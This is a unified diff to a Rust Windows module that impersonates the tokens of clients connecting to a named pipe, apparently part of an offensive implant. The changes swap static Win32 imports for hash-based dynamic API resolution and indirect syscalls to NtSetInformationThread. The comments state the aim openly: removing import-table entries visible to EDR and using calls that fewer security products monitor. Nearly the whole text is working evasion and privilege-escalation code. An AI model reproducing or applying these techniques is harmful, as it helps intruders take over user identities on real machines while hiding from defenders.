@@ -54,18 +54,102 @@ use winapi::um::winnt::{
     SecurityImpersonation, TokenImpersonation, TokenPrimary,
 };
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-use winapi::um::processthreadsapi::{
-    GetCurrentThread, OpenThreadToken, SetThreadToken,
-};
-use winapi::um::securitybaseapi::{DuplicateTokenEx, GetTokenInformation, RevertToSelf};
-// WaitForSingleObject removed — using NtWaitForSingleObject indirect syscall
+// All function imports removed — resolved dynamically via pe_resolve or indirect
+// syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
 use winapi::um::winbase::WAIT_OBJECT_0;
 use winapi::um::winnt::{TOKEN_STATISTICS, TOKEN_TYPE};
 use winapi::shared::minwindef::{DWORD, LPVOID, TRUE};
 use winapi::shared::ntdef::NTSTATUS;
-use winapi::um::namedpipeapi::{ConnectNamedPipe, CreateNamedPipeA, ImpersonateNamedPipeClient};
 use winapi::um::winbase::PIPE_ACCESS_DUPLEX;
 use winapi::um::winnt::PIPE_TYPE_BYTE;
+
+// ── Dynamic API resolution (IAT elimination) ────────────────────────────────
+//
+// All win32 API calls in this module are resolved dynamically at first use via
+// `pe_resolve::get_proc_address_by_hash`.  The resolved function pointers are
+// cached in `OnceLock` statics so resolution only happens once.
+//
+// Hashes are computed at compile time via `pe_resolve::hash_str()` with the
+// project's rotational hash and seed.  Module hashes (e.g. advapi32.dll) are
+// also computed at call time since they depend on the same seed.
+
+/// Declare a lazily-resolved function pointer static.
+/// Usage: `dynamic_fn!(MY_FN, b"advapi32.dll\0", b"GetTokenInformation\0", unsafe extern "system" fn(...) -> BOOL);`
+/// Retrieve with: `MY_FN.get().and_then(|opt| *opt)`
+macro_rules! dynamic_fn {
+    ($static_name:ident, $dll_bytes:expr, $fn_bytes:expr, $sig:ty) => {
+        static $static_name: OnceLock<Option<$sig>> = OnceLock::new();
+    };
+}
+
+/// Resolve a dynamically-declared function, returning `None` if unavailable.
+fn resolve_fn<T>(lock: &OnceLock<Option<T>>, dll_bytes: &[u8], fn_bytes: &[u8]) -> Option<T>
+where
+    T: Copy,
+{
+    lock.get_or_init(|| unsafe {
+        let dll_hash = pe_resolve::hash_str(dll_bytes);
+        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let fn_hash = pe_resolve::hash_str(fn_bytes);
+        let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+        Some(std::mem::transmute::<usize, T>(addr))
+    }).and_then(|&opt| opt)
+}
+
+// ── advapi32.dll functions ──────────────────────────────────────────────────
+
+dynamic_fn!(GET_TOKEN_INFORMATION, b"advapi32.dll\0", b"GetTokenInformation\0",
+            unsafe extern "system" fn(HANDLE, DWORD, LPVOID, DWORD, *mut DWORD) -> i32);
+
+dynamic_fn!(DUPLICATE_TOKEN_EX, b"advapi32.dll\0", b"DuplicateTokenEx\0",
+            unsafe extern "system" fn(HANDLE, DWORD, *mut SECURITY_ATTRIBUTES, DWORD, DWORD, *mut HANDLE) -> i32);
+
+dynamic_fn!(CONVERT_SID_TO_STRING_SID_A, b"advapi32.dll\0", b"ConvertSidToStringSidA\0",
+            unsafe extern "system" fn(*mut winapi::um::winnt::SID, *mut *mut i8) -> i32);
+
+dynamic_fn!(LOOKUP_ACCOUNT_SID_A, b"advapi32.dll\0", b"LookupAccountSidA\0",
+            unsafe extern "system" fn(LPVOID, *mut winapi::um::winnt::SID, *mut i8, *mut DWORD, *mut i8, *mut DWORD, *mut DWORD) -> i32);
+
+// ── kernel32.dll functions ──────────────────────────────────────────────────
+
+dynamic_fn!(LOCAL_FREE, b"kernel32.dll\0", b"LocalFree\0",
+            unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void);
+
+// ── Named pipe functions (advapi32/kernel32) ────────────────────────────────
+
+dynamic_fn!(CONNECT_NAMED_PIPE, b"kernel32.dll\0", b"ConnectNamedPipe\0",
+            unsafe extern "system" fn(HANDLE, *mut std::ffi::c_void) -> i32);
+
+dynamic_fn!(CREATE_NAMED_PIPE_A, b"kernel32.dll\0", b"CreateNamedPipeA\0",
+            unsafe extern "system" fn(*const i8, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, *mut SECURITY_ATTRIBUTES) -> HANDLE);
+
+dynamic_fn!(IMPERSONATE_NAMED_PIPE_CLIENT, b"advapi32.dll\0", b"ImpersonateNamedPipeClient\0",
+            unsafe extern "system" fn(HANDLE) -> i32);
+
+// ── Indirect syscall for NtSetInformationThread (replaces SetThreadToken / RevertToSelf) ──
+
+/// Apply an impersonation token to the current thread via NtSetInformationThread.
+/// This replaces both `SetThreadToken(NULL, token)` and the fallback `RevertToSelf()`.
+unsafe fn nt_set_impersonation_token(token_handle: HANDLE) -> i32 {
+    let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
+        Ok(t) => t,
+        Err(e) => {
+            log::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
+            return STATUS_ACCESS_DENIED;
+        }
+    };
+    let token_value = token_handle as u64;
+    crate::syscalls::do_syscall(
+        target.ssn,
+        target.gadget_addr,
+        &[
+            (-1isize) as u64, // NtCurrentThread()
+            THREAD_IMPERSONATION_TOKEN as u64,
+            &token_value as *const u64 as u64,
+            std::mem::size_of::<u64>() as u64,
+        ],
+    )
+}
 
 // ── Constants ─────────────────────────────────────────────────────────────
 
@@ -305,8 +389,10 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
 
     // First call to get the required buffer size.
     let mut needed: DWORD = 0;
+    let get_token_info = resolve_fn(&GET_TOKEN_INFORMATION, b"advapi32.dll\0", b"GetTokenInformation\0")
+        .ok_or_else(|| anyhow!("failed to resolve GetTokenInformation dynamically"))?;
     unsafe {
-        GetTokenInformation(
+        get_token_info(
             token,
             TokenUser,
             std::ptr::null_mut(),
@@ -322,7 +408,7 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
     let mut buffer: Vec<u8> = vec![0u8; needed as usize];
     let mut return_length: DWORD = 0;
     let ok = unsafe {
-        GetTokenInformation(
+        get_token_info(
             token,
             TokenUser,
             buffer.as_mut_ptr() as LPVOID,
@@ -340,12 +426,19 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
 
     // Convert SID to string.
     let mut sid_str: *mut i8 = std::ptr::null_mut();
-    let ok = unsafe { winapi::um::securitybaseapi::ConvertSidToStringSidA(sid, &mut sid_str) };
+    let convert_sid = resolve_fn(&CONVERT_SID_TO_STRING_SID_A, b"advapi32.dll\0", b"ConvertSidToStringSidA\0")
+        .ok_or_else(|| anyhow!("failed to resolve ConvertSidToStringSidA dynamically"))?;
+    let local_free_fn = resolve_fn(&LOCAL_FREE, b"kernel32.dll\0", b"LocalFree\0");
+    let ok = unsafe { convert_sid(sid, &mut sid_str) };
     let sid_string = if ok != 0 && !sid_str.is_null() {
         let s = unsafe { std::ffi::CStr::from_ptr(sid_str) }
             .to_string_lossy()
             .to_string();
-        unsafe { winapi::um::heapapi::LocalFree(sid_str as *mut _) };
+        if let Some(free_fn) = local_free_fn {
+            unsafe { free_fn(sid_str as *mut _) };
+        } else {
+            log::warn!("token_impersonation: LocalFree not resolved, leaking SID string buffer");
+        }
         s
     } else {
         "(unknown)".to_string()
@@ -357,8 +450,10 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
     let mut domain_buf = [0u8; 256];
     let mut domain_len: DWORD = 256;
     let mut sid_type: DWORD = 0;
+    let lookup_sid = resolve_fn(&LOOKUP_ACCOUNT_SID_A, b"advapi32.dll\0", b"LookupAccountSidA\0")
+        .ok_or_else(|| anyhow!("failed to resolve LookupAccountSidA dynamically"))?;
     let ok = unsafe {
-        winapi::um::securitybaseapi::LookupAccountSidA(
+        lookup_sid(
             std::ptr::null_mut(),
             sid,
             name_buf.as_mut_ptr() as *mut _,
@@ -399,8 +494,15 @@ struct ImpersonationThreadCtx {
 unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     let ctx = &*(param as *const ImpersonationThreadCtx);
 
-    // Wait for a client to connect.
-    let wait_result = ConnectNamedPipe(ctx.pipe_handle, std::ptr::null_mut());
+    // Wait for a client to connect (dynamically resolved — no IAT entry).
+    let connect_fn = match resolve_fn(&CONNECT_NAMED_PIPE, b"kernel32.dll\0", b"ConnectNamedPipe\0") {
+        Some(f) => f,
+        None => {
+            log::error!("token_impersonation: ConnectNamedPipe not resolved");
+            return 997;
+        }
+    };
+    let wait_result = unsafe { connect_fn(ctx.pipe_handle, std::ptr::null_mut()) };
     // ConnectNamedPipe returns nonzero on success for overlapped mode,
     // zero for non-overlapped.  For non-overlapped, zero means success.
     // ERROR_PIPE_CONNECTED (535) means a client is already connected.
@@ -412,8 +514,15 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
         return 1;
     }
 
-    // Impersonate the pipe client on THIS helper thread.
-    let ok = ImpersonateNamedPipeClient(ctx.pipe_handle);
+    // Impersonate the pipe client on THIS helper thread (dynamically resolved).
+    let impersonate_fn = match resolve_fn(&IMPERSONATE_NAMED_PIPE_CLIENT, b"advapi32.dll\0", b"ImpersonateNamedPipeClient\0") {
+        Some(f) => f,
+        None => {
+            log::error!("token_impersonation: ImpersonateNamedPipeClient not resolved");
+            return 998;
+        }
+    };
+    let ok = unsafe { impersonate_fn(ctx.pipe_handle) };
     if ok == 0 {
         let err = winapi::um::errhandlingapi::GetLastError();
         log::warn!(
@@ -507,12 +616,14 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
     log::info!("token_impersonation: creating pipe '{full_path}' (strategy={})",
         if config.prefer_set_thread_token { "SetThreadToken" } else { "ImpersonationThread" });
 
-    // Create the named pipe.
+    // Create the named pipe (dynamically resolved — no IAT entry).
     let pipe_path_c = std::ffi::CString::new(full_path.as_str())
         .map_err(|e| anyhow!("invalid pipe path: {e}"))?;
 
+    let create_pipe_fn = resolve_fn(&CREATE_NAMED_PIPE_A, b"kernel32.dll\0", b"CreateNamedPipeA\0")
+        .ok_or_else(|| anyhow!("failed to resolve CreateNamedPipeA dynamically"))?;
     let pipe_handle = unsafe {
-        CreateNamedPipeA(
+        create_pipe_fn(
             pipe_path_c.as_ptr() as *mut _,
             PIPE_ACCESS_DUPLEX,
             PIPE_TYPE_BYTE,
@@ -625,14 +736,14 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
     let (user, domain, sid) = query_token_user(dup_token)
         .unwrap_or_else(|_| ("(unknown)".to_string(), "(unknown)".to_string(), "(unknown)".to_string()));
 
-    // Apply the duplicated token to the current thread via SetThreadToken.
-    // This is the key API — lower-level than ImpersonateNamedPipeClient
-    // and monitored by fewer EDR products.
-    let ok = unsafe { SetThreadToken(std::ptr::null_mut(), dup_token) };
-    if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+    // Apply the duplicated token to the current thread via NtSetInformationThread
+    // (indirect syscall — no IAT entry, replacing SetThreadToken).
+    let status = unsafe { nt_set_impersonation_token(dup_token) };
+    if nt_error(status) {
         nt_close_handle(dup_token);
-        return Err(anyhow!("SetThreadToken failed: Win32 error {err}"));
+        return Err(anyhow!(
+            "NtSetInformationThread(ThreadImpersonationToken) failed in SetThreadToken path: 0x{status:08X}"
+        ));
     }
 
     // Cache the token.
@@ -753,7 +864,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
     // This is the NT-native equivalent of SetThreadToken — even fewer EDRs
     // hook this because it's rarely used by legitimate applications.
     let status = unsafe {
-        nt_set_thread_impersonation_token(GetCurrentThread(), dup_token)
+        nt_set_impersonation_token(dup_token)
     };
 
     if nt_error(status) {
@@ -989,11 +1100,12 @@ pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
         (token.handle, token.user.clone(), token.domain.clone())
     }; // guard dropped
 
-    // Apply via SetThreadToken (more commonly available than NtSetInformationThread).
-    let ok = unsafe { SetThreadToken(std::ptr::null_mut(), handle) };
-    if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
-        return Err(anyhow!("SetThreadToken failed: Win32 error {err}"));
+    // Apply via NtSetInformationThread (indirect syscall — no IAT entry).
+    let status = unsafe { nt_set_impersonation_token(handle) };
+    if nt_error(status) {
+        return Err(anyhow!(
+            "NtSetInformationThread(ThreadImpersonationToken) failed for cached token: 0x{status:08X}"
+        ));
     }
 
     log::debug!("token_impersonation: applied cached token for {domain}\\{user}");
@@ -1009,10 +1121,13 @@ pub fn shutdown() {
         // No need to call nt_close_handle explicitly — the Drop impl handles it.
         cache.drain();
     }
-    }
 
-    // Revert any active impersonation.
-    unsafe { RevertToSelf() };
+    // Revert any active impersonation via NtSetInformationThread.
+    let null_token: u64 = 0;
+    let revert_status = unsafe { nt_set_impersonation_token(std::ptr::null_mut()) };
+    if nt_error(revert_status) {
+        log::warn!("token_impersonation: shutdown revert failed: 0x{revert_status:08X}");
+    }
 
     log::info!("token_impersonation: shutdown complete, all tokens released");
 }
